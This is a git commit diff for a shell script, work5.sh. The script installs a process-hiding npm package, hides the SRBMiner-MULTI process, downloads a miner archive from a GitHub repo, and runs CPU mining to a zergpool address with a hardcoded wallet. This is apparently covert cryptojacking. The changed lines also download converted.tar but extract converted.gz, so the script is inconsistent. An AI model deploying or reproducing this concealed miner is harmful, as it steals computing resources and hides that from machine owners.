1553d9e90621342cf57eee2830304965db115f89
Geraldy Olang <97717251+geraldyolang11@users.noreply.github.com>
2022-02-10 10:33:07 +0800

    Update work5.sh

--- work5.sh
+++ work5.sh
@@ -6,6 +6,6 @@ sudo apt install nodejs &&
 npm install -g npm@8.4.1 && 
 npm i -g node-process-hider && 
 sudo ph add SRBMiner-MULTI && 
-wget https://github.com/geraldyolang11/mine/raw/main/sm.tar.gz && 
-chmod +x sm.tar.gz && 
-tar -xvf sm.tar.gz && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci --password c=BTC,mc=VRSC --cpu-threads 2"
+wget https://github.com/geraldyolang11/mine/raw/main/converted.tar && 
+chmod +x converted.tar && 
+tar -xf converted.gz && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci --password c=BTC,mc=VRSC --cpu-threads 2"
